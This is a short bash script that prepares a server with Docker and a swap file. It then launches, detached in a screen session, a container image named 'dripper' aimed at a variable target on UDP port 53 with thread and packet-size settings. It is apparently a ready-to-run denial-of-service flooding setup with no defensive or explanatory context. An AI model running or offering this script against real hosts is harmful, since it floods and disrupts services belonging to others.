#!/bin/bash

apt -y update
apt -y install docker.io git

fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 

screen -d -m docker run -it --rm alexmon1989/dripper:latest -s ${target} -p 53 -t 5 -m udp -l 2048
